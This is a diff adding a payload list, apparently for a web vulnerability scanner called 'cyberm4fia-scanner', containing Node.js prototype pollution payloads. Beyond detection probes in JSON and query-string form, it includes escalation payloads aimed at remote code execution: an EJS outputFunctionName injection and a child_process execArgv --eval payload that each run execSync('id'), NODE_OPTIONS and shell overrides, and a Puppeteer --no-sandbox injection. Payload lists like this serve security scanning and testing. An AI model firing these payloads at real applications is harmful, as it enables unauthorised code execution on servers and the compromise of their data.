@@ -1,0 +1,30 @@
+# Prototype Pollution Payloads (Node.js) — cyberm4fia-scanner
+# Categories: Detection, Escalation, EJS RCE
+
+# ─── Detection ───
+{"__proto__": {"polluted": true}}
+{"constructor": {"prototype": {"polluted": true}}}
+{"__proto__.polluted": true}
+
+# ─── HTTP Parameter ───
+?__proto__.polluted=true
+?constructor.prototype.polluted=true
+?__proto__[polluted]=true
+
+# ─── Escalation to RCE (EJS) ───
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
+
+# ─── child_process Escalation ───
+{"__proto__": {"shell": "/proc/self/exe"}}
+{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
+{"__proto__": {"env": {"NODE_DEBUG": "id"}}}
+
+# ─── Via child_process.fork/spawn ───
+{"__proto__": {"execArgv": ["--eval", "require('child_process').execSync('id')"]}}
+
+# ─── Via Puppeteer options ───
+{"__proto__": {"args": ["--no-sandbox"]}}
+
+# ─── Via Nested Merges ───
+{"a": {"__proto__": {"polluted": true}}}
+{"a": {"b": {"__proto__": {"polluted": true}}}}
